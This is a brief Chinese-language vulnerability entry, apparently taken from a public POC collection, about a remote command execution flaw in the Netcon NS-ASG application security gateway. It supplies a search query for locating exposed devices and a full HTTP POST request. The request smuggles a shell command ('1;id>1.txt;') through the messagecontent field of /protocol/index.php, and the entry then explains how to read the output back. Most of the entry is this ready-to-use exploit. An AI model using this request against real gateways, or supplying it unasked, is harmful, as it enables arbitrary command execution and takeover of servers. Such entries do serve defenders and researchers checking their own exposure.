# 网康 NS-ASG应用安全网关存在远程命令执行漏洞

# 一、漏洞简介
网康科技有限公司是中国技术领先的网络应用管理设备提供商，专注于网络应用管理领域最前沿的趋势研究和分析，为用户提供先进的网络应用管理技术、产品与解决方案，旨在帮助用户实现“上好网 用好网”的网络管理目标。网康应用安全网关系统存在远程命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ 网康应用安全网关系统

# 三、资产测绘
+ hunter`web.title=="网康 NS-ASG 应用安全网关"`
+ 特征


# 四、漏洞复现
1. 执行如下执行POC语句，同时执行id命令并写入/protocol/1.txt。

```plain
POST /protocol/index.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```


2. 访问`/protocol/1.txt`路径，获取命令执行结果。

```plain
/protocol/1.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zut666gci4d1s4sv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
